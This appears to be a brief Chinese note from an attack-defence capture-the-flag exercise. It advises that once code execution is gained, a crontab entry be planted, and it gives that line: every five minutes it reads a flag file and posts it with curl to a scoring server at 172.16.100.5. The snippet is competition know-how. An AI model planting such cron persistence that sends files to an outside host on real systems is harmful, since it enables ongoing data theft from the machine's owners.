```
拿到执行之后直接一个crontab挂上去。
http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html
​```
*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d 'flag='$(cat /home/njweb/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'
​```
```

